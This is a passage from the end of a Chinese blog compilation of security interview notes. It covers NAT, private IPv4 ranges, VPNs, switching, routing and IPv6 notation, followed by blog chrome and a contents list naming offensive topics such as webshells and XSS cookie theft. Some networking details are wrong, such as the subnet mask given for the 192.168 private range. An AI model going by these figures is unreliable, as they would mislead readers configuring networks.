+<p>经过以上处理还不能解决问题，强烈建议您将系统盘和数据盘的数据完全下载备份到本地保存后，重置全盘（登陆<a href="http://www.aliyun.com" target="_blank" rel="noopener">www.aliyun.com</a>, 进入我的阿里云-》管理控制台-》云服务器ECS控制台-》点击进行您需要进行初始化的实例，备份完服务器数据后关闭实例，点击“重置磁盘”，按您的实际情况选择系统盘和数据盘重置即可）后，重新部署程序应用并对数据进行杀毒后上传，并重新进行前述的3步处理。</p>
+<p>内网网址</p>
+<h3 id="23-NAT（网络地址转换）协议"><a href="#23-NAT（网络地址转换）协议" class="headerlink" title="23. NAT（网络地址转换）协议"></a>23. NAT（网络地址转换）协议</h3><p>内网的计算机以NAT（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p>
+<p>NAT（Network Address Translator）是网络地址转换，它实现内网的IP地址与公网的地址之间的相互转换，将大量的内网IP地址转换为一个或少量的公网IP地址，减少对公网IP地址的占用。NAT的最典型应用是：在一个局域网内，只需要一台计算机连接上Internet，就可以利用NAT共享Internet连接，使局域网内其他计算机也可以上网。使用NAT协议，局域网内的计算机可以访问Internet上的计算机，但Internet上的计算机无法访问局域网内的计算机。</p>
+<p>A类 10.0.0.0–10.255.255.255</p>
+<p>B类 172.16.0.0–172.31.255.255</p>
+<p>C类 192.168.0.0–192.168.255.255</p>
+<p>内网保留地址编辑</p>
+<p>Internet设计者保留了IPv4地址空间的一部份供专用地址使用,专用地址空间中的IPv4地址叫专用地址,这些地址永远不会被当做公用地址来分配,所以专用地址永远不会与公用地址重复.</p>
+<p>IPv4专用地址如下：</p>
+<p>IP等级 IP位置</p>
+<p>ClassA 10.0.0.0-10.255.255.255</p>
+<p>默认子网掩码:255.0.0.0</p>
+<p>ClassB 172.16.0.0-172.31.255.255</p>
+<p>默认子网掩码:255.240.0.0</p>
+<p>ClassC 192.168.0.0-192.168.255.255</p>
+<p>默认子网掩码:255.255.0.0</p>
+<p>内网是可以上网的.内网需要一台服务器或路由器做网关,通过它来上网</p>
+<p>做网关的服务器有一个网关（服务器/路由器）的IP地址,其它内网电脑的IP可根据它来随意设置,前提是IP前三个数要跟它一样,第四个可从0-255中任选但要跟服务器的IP不同</p>
+<h3 id="24-内网穿透"><a href="#24-内网穿透" class="headerlink" title="24.内网穿透"></a>24.内网穿透</h3><p>即NAT穿透，采用端口映射，让外网的电脑找到处于内网的电脑，同时也可基于HTTP/2实现web内网穿透。 </p>
+<h3 id="25-虚拟专用网络"><a href="#25-虚拟专用网络" class="headerlink" title="25.虚拟专用网络"></a>25.虚拟专用网络</h3><p>功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。例如某公司员工出差到外地，他想访问企业内网的服务器资源，这种访问就属于远程访问。</p>
+<p>让外地员工访问到内网资源，利用VPN的解决方法就是在内网中架设一台VPN服务器。外地员工在当地连上互联网后，通过互联网连接VPN服务器，然后通过VPN服务器进入企业内网。为了保证数据安全，VPN服务器和客户机之间的通讯数据都进行了加密处理。有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，就如同专门架设了一个专用网络一样，但实际上VPN使用的是互联网上的公用链路，因此VPN称为虚拟专用网络，其实质上就是利用加密技术在公网上封装出一个数据通讯隧道。有了VPN技术，用户无论是在外地出差还是在家中办公，只要能上互联网就能利用VPN访问内网资源，这就是VPN在企业中应用得如此广泛的原因。</p>
+<h3 id="26-二层交换机"><a href="#26-二层交换机" class="headerlink" title="26.二层交换机"></a>26.二层交换机</h3><p>二层交换机工作于OSI模型的第2层（数据链路层），故而称为二层交换机。二层交换技术的发展已经比较成熟，二层交换机属数据链路层设备，可以识别数据包中的MAC地址信息，根据MAC地址进行转发，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。</p>
+<p>过程</p>
+<p>（1）当交换机从某个端口收到一个数据包，它先读取包头中的源MAC地址，这样它就知道源MAC地址的机器是连在哪个端口上的；</p>
+<p>（2）再去读取包头中的目的MAC地址，并在地址表中查找相应的端口；</p>
+<p>（3）如表中有与这目的MAC地址对应的端口，把数据包直接复制到这端口上；</p>
+<p>（4）如表中找不到相应的端口则把数据包广播到所有端口上，当目的机器对源机器回应时，交换机又可以学习一目的MAC地址与哪个端口对应，在下次传送数据时就不再需要对所有端口进行广播了。</p>
+<p>不断的循环这个过程，对于全网的MAC地址信息都可以学习到，二层交换机就是这样建立和维护它自己的地址表。</p>
+<h3 id="27-路由技术"><a href="#27-路由技术" class="headerlink" title="27.路由技术"></a>27.路由技术</h3><p>路由器工作在OSI模型的第三层—网络层操作，其工作模式与二层交换相似，但路由器工作在第三层，这个区别决定了路由和交换在传递包时使用不同的控制信息，实现功能的方式就不同。工作原理是在路由器的内部也有一个表，这个表所标示的是如果要去某一个地方，下一步应该向哪里走，如果能从路由表中找到数据包下一步往哪里走，把链路层信息加上转发出去；如果不能知道下一步走向哪里，则将此包丢弃，然后返回一个信息交给源地址。</p>
+<p>路由技术实质上来说不过两种功能：决定最优路由和转发数据包。</p>
+<h3 id="28-三层交换机"><a href="#28-三层交换机" class="headerlink" title="28.三层交换机"></a>28.三层交换机</h3><p>三层交换机就是具有部分路由器功能的交换机，三层交换机的最重要目的是加快大型局域网内部的数据交换，所具有的路由功能也是为这目的服务的，能够做到一次路由，多次转发。对于数据包转发等规律性的过程由硬件高速实现，而像路由信息更新、路由表维护、路由计算、路由确定等功能，由软件实现。三层交换技术就是二层交换技术+三层转发技术。传统交换技术是在OSI网络标准模型第二层——数据链路层进行操作的，而三层交换技术是在网络模型中的第三层实现了数据包的高速转发，既可实现网络路由功能，又可根据不同网络状况做到最优网络性能。</p>
+<h3 id="29-IPv6地址表示"><a href="#29-IPv6地址表示" class="headerlink" title="29.IPv6地址表示"></a>29.IPv6地址表示</h3><p>IPv6的128位地址通常写成8组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002是一个合法的IPv6地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示，上述地址就可写成AD80::ABAA:0000:00C2:0002。同时前导的零可以省略，因此2001:0DB8:02de::0e13等价于2001:DB8:2de::e13。</p>
+<p>就不要吐槽排版问题了，因为实在是太多了，都是网上转载的，希望对将要面试的<br>你有所帮助！！！</p>
+<p>蕾姆镇楼！！！</p>
+<p><img src="http://i1.hdslb.com/bfs/archive/298e7680e52c1a58dce6ddbedffab96635ef1532.jpg" alt=""></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/安全面试题整理/">安全面试题整理</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2018年08月19日 - 19:08</p>
+  <p><span>最后更新:</span>2018年08月19日 - 20:08</p>
+  <p><span>原始链接:</span><a href="/安全面试题整理/" title="安全面试题整理">https://lengjibo.github.io/安全面试题整理/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/安全面试题整理/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全面试题/" rel="tag"><i class="fa fa-tag"></i> 安全面试题</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/python数据类型/" rel="next" title="python数据类型">
+                <i class="fa fa-chevron-left"></i> python数据类型
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/St2-057复现/" rel="prev" title="St2-057复现">
+                St2-057复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.screenshot.net/9zoe9ax"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">55</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">80</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://nsroms.com/" title="philipzou" target="_blank">philipzou</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透测试安全面试题（1）"><span class="nav-number">1.</span> <span class="nav-text">渗透测试安全面试题（1）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1，做一下简单的自我介绍，经历，工作经验，爱好，自己总结。"><span class="nav-number">1.0.1.</span> <span class="nav-text">1，做一下简单的自我介绍，经历，工作经验，爱好，自己总结。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一，给你一个网站你是如何来渗透测试的"><span class="nav-number">1.0.2.</span> <span class="nav-text">一，给你一个网站你是如何来渗透测试的?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一，sqlmap，怎么对一个注入点注入？"><span class="nav-number">1.0.3.</span> <span class="nav-text">一，sqlmap，怎么对一个注入点注入？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二，nmap，扫描的几种方式"><span class="nav-number">1.0.4.</span> <span class="nav-text">二，nmap，扫描的几种方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三，sql注入的几种类型？"><span class="nav-number">1.0.5.</span> <span class="nav-text">三，sql注入的几种类型？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四，报错注入的函数有哪些？-10个"><span class="nav-number">1.0.6.</span> <span class="nav-text">四，报错注入的函数有哪些？ 10个</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五，延时注入如何来判断？"><span class="nav-number">1.0.7.</span> <span class="nav-text">五，延时注入如何来判断？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#六，盲注和延时注入的共同点？"><span class="nav-number">1.0.8.</span> <span class="nav-text">六，盲注和延时注入的共同点？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#七，如何拿一个网站的webshell？"><span class="nav-number">1.0.9.</span> <span class="nav-text">七，如何拿一个网站的webshell？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#八，sql注入写文件都有哪些函数？"><span class="nav-number">1.0.10.</span> <span class="nav-text">八，sql注入写文件都有哪些函数？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#九，如何防止CSRF"><span class="nav-number">1.0.11.</span> <span class="nav-text">九，如何防止CSRF?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#十，owasp-漏洞都有哪些？"><span class="nav-number">1.0.12.</span> <span class="nav-text">十，owasp 漏洞都有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#十一：SQL注入防护方法？"><span class="nav-number">1.0.13.</span> <span class="nav-text">十一：SQL注入防护方法？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#十二，代码执行，文件读取，命令执行的函数都有哪些？"><span class="nav-number">1.0.14.</span> <span class="nav-text">十二，代码执行，文件读取，命令执行的函数都有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"><span class="nav-number">1.0.15.</span> <span class="nav-text">十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#十四，img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。"><span class="nav-number">1.0.16.</span> <span class="nav-text">十四，img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透测试安全面试题（2）"><span class="nav-number">2.</span> <span class="nav-text">渗透测试安全面试题（2）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、网站入侵分析"><span class="nav-number">2.0.1.</span> <span class="nav-text">1、网站入侵分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、判断分析网页漏洞"><span class="nav-number">2.0.2.</span> <span class="nav-text">2、判断分析网页漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、网页木马的防御和清除"><span class="nav-number">2.0.3.</span> <span class="nav-text">四、网页木马的防御和清除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#centos-iptables防火墙的基本命令解析"><span class="nav-number">2.0.4.</span> <span class="nav-text">centos iptables防火墙的基本命令解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是网页挂马-网页挂马都有什么类型"><span class="nav-number">2.0.5.</span> <span class="nav-text">什么是网页挂马?网页挂马都有什么类型?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#恶意软件的定义"><span class="nav-number">2.0.6.</span> <span class="nav-text">恶意软件的定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍一下常见的木马种类"><span class="nav-number">2.0.7.</span> <span class="nav-text">介绍一下常见的木马种类?</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于某知名网络安全公司的面试笔试"><span class="nav-number">3.</span> <span class="nav-text">关于某知名网络安全公司的面试笔试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-描述tcp的三次插手，写出syn-ack的关系"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.描述tcp的三次插手，写出syn ack的关系</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：描述tcp-udp的区别及优劣。描述p2p机制，及其发展前景"><span class="nav-number">3.0.2.</span> <span class="nav-text">2：描述tcp/udp的区别及优劣。描述p2p机制，及其发展前景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3排序，用冒泡法或快速排序法，并分析时间-空间复杂度"><span class="nav-number">3.0.3.</span> <span class="nav-text">3排序，用冒泡法或快速排序法，并分析时间/空间复杂度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IBatis如何防范SQL-注入攻击"><span class="nav-number">3.0.4.</span> <span class="nav-text">IBatis如何防范SQL 注入攻击?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何保障Web服务器安全"><span class="nav-number">3.0.5.</span> <span class="nav-text">如何保障Web服务器安全?</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络安全类面试题"><span class="nav-number">4.</span> <span class="nav-text">网络安全类面试题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#怎么样提高局域网安全"><span class="nav-number">4.0.1.</span> <span class="nav-text">怎么样提高局域网安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何判断计算机可能已经中马"><span class="nav-number">4.0.2.</span> <span class="nav-text">如何判断计算机可能已经中马?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么叫做SQL注入，如何防止-请举例说明。"><span class="nav-number">4.0.3.</span> <span class="nav-text">什么叫做SQL注入，如何防止?请举例说明。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#能否解释一下XSS-cookie盗窃是什么意思"><span class="nav-number">4.0.4.</span> <span class="nav-text">能否解释一下XSS cookie盗窃是什么意思?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#木马的传播途径主要有哪些"><span class="nav-number">4.0.5.</span> <span class="nav-text">木马的传播途径主要有哪些?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入攻击的种类有哪些"><span class="nav-number">4.0.6.</span> <span class="nav-text">SQL注入攻击的种类有哪些?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#请介绍一下常见的网络安全防护软件的性能"><span class="nav-number">4.0.7.</span> <span class="nav-text">请介绍一下常见的网络安全防护软件的性能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#作为网站管理者应当如何防范XSS"><span class="nav-number">4.0.8.</span> <span class="nav-text">作为网站管理者应当如何防范XSS?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见的Web漏洞有哪些"><span class="nav-number">4.0.9.</span> <span class="nav-text">常见的Web漏洞有哪些?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web应用常见的安全漏洞有哪些"><span class="nav-number">4.0.10.</span> <span class="nav-text">Web应用常见的安全漏洞有哪些?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御和检查SQL注入的主要手段有哪些"><span class="nav-number">4.0.11.</span> <span class="nav-text">防御和检查SQL注入的主要手段有哪些?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是网络安全中的双因素认证"><span class="nav-number">4.0.12.</span> <span class="nav-text">什么是网络安全中的双因素认证?</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#笔试题————1、网络安全、Web安全、渗透测试笔试总结"><span class="nav-number">5.</span> <span class="nav-text">笔试题————1、网络安全、Web安全、渗透测试笔试总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#对称加密-非对称加密？"><span class="nav-number">5.0.1.</span> <span class="nav-text">对称加密 非对称加密？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是同源策略？"><span class="nav-number">5.0.2.</span> <span class="nav-text">什么是同源策略？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookie存在哪里？可以打开吗"><span class="nav-number">5.0.3.</span> <span class="nav-text">cookie存在哪里？可以打开吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss如何盗取cookie？"><span class="nav-number">5.0.4.</span> <span class="nav-text">xss如何盗取cookie？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcp、udp的区别及tcp三次握手，syn攻击？"><span class="nav-number">5.0.5.</span> <span class="nav-text">tcp、udp的区别及tcp三次握手，syn攻击？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、TCP握手协议"><span class="nav-number">5.0.6.</span> <span class="nav-text">二、TCP握手协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、SYN攻击原理"><span class="nav-number">5.0.7.</span> <span class="nav-text">三、SYN攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#证书要考哪些？"><span class="nav-number">5.0.8.</span> <span class="nav-text">证书要考哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DVWA是如何搭建的？"><span class="nav-number">5.0.9.</span> <span class="nav-text">DVWA是如何搭建的？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试的流程是什么"><span class="nav-number">5.0.10.</span> <span class="nav-text">渗透测试的流程是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss如何防御"><span class="nav-number">5.0.11.</span> <span class="nav-text">xss如何防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS服务器应该做哪些方面的保护措施："><span class="nav-number">5.0.12.</span> <span class="nav-text">IIS服务器应该做哪些方面的保护措施：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#虚拟机的几种连接方式及原理"><span class="nav-number">5.0.13.</span> <span class="nav-text">虚拟机的几种连接方式及原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss有cookie一定可以无用户名密码登录吗？"><span class="nav-number">5.0.14.</span> <span class="nav-text">xss有cookie一定可以无用户名密码登录吗？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#笔试题————网络安全、web安全、渗透测试之笔试总结（二）"><span class="nav-number">6.</span> <span class="nav-text">笔试题————网络安全、web安全、渗透测试之笔试总结（二）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-什么是WebShell"><span class="nav-number">6.0.1.</span> <span class="nav-text">1.什么是WebShell?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-什么是网络钓鱼？"><span class="nav-number">6.0.2.</span> <span class="nav-text">2.什么是网络钓鱼？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-什么是CC攻击？"><span class="nav-number">6.0.3.</span> <span class="nav-text">4.什么是CC攻击？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Web服务器被入侵后，怎样进行排查？"><span class="nav-number">6.0.4.</span> <span class="nav-text">5.Web服务器被入侵后，怎样进行排查？</span></a></li><li 